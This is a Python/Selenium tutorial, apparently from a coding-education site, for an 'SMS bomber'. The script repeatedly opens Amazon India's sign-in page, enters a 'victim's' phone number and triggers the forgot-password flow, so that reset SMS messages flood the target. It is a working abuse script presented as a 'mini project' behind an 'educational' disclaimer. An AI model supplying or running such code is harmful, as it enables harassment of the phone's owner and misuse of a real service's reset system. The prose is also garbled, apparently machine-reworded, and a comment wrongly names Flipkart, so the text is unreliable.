Selenium Base Mini Project Using Python



 ** _Project Description:-_** Here, we’re going to study a simple SMS bomber
trick (for amusing and educational purpose). Selenium is a free tool for
automated trying out across exceptional browsers. In this tutorial, we will
learn how to ship mechanically range of unsolicited mail SMS for given variety
of frequency and interval.

 **Requirement:**

You need to install chromedriver and set path. Click here to download.for more
information follow this link.

 ** _Below are the steps:_**

  1. First go to amazon website using this Link.
  2. Then click on investigate element by urgent ctrl + shift + i or stepping into setting of browser and clicking on investigate detail manually.
  3. Then navigate box where the friend mobile number are fill then copy the x_path.
  4. Then navigate the continue button then copy the x_path.
  5. Then navigate the forget password then copy the x_path.
  6. Then again step 3 repeat.
  7. Then again step 4 repeat.

 **Given some screenshot to follow this instruction step by step:**

  

  

Step 1-

![](https://media.geeksforgeeks.org/wp-
content/uploads/20200617115941/amazonss1-300x168.png)

Step 2-

![](https://media.geeksforgeeks.org/wp-
content/uploads/20200617120030/amazonss2-300x168.png)

Step 3-

![](https://media.geeksforgeeks.org/wp-
content/uploads/20200617120108/amazonss3-300x168.png)

Step 4-

![](https://media.geeksforgeeks.org/wp-
content/uploads/20200617120204/amazonss4-300x168.png)

Step 5-

![](https://media.geeksforgeeks.org/wp-
content/uploads/20200617120251/amazonss5-300x168.png)

Step 6-

![](https://media.geeksforgeeks.org/wp-
content/uploads/20200617120322/amazonss6-300x168.png)

Now, Run the script by way of putting suitable x_path and automatically send
junk mail sms for your friend’s cellular number.

 **Note:** This tutorial is for educational motive only, please don’t use it
for disturbing anyone or any unethical way.

Below is the implementation:

 __

 __  
 __

 __

 __  
 __  
 __

from selenium import webdriver

from selenium.webdriver.common.keys import Keys

import time

for i in range(20):

 # create instance of Chrome webdriver

 driver=webdriver.Chrome() 


driver.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return;_to=https%3A%2F%2Fwww.amazon.in%2Fgp%2Fcss%2Fhomepage.html%3Ffrom%3Dhz%26ref_%3Dnav_signin&openid.identity;=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc;_handle=inflex&openid.mode;=checkid_setup&openid.claimed;_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns;=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")

 

 # find the element where we have to 

 # enter the xpath

 # target mobile number, change it to victim's number and 

 # also ensure that it's registered on flipkart

 


driver.find_element_by_xpath('//*[@id="ap_email"]').send_keys('xxxx6126')

 # find the element continue 

 # request using xpath 

 # clicking on that element 

 

 driver.find_element_by_xpath('//*[@id="continue"]').click()

 # find the element to send a forgot password 

 # request using xpath 

 

 driver.find_element_by_xpath('//*[@id="auth-fpp-link-
bottom"]').click()

 driver.find_element_by_xpath('//*[@id="continue"]').click()

 

 # set the interval to send each sms

 time.sleep(4)

 

 # Close the browser

 driver.close()  
  
---  
  
 __

 __

Attention geek! Strengthen your foundations with the **Python Programming
Foundation** Course and learn the basics.

To begin with, your interview preparations Enhance your Data Structures
concepts with the **Python DS** Course.

My Personal Notes _arrow_drop_up_

Save

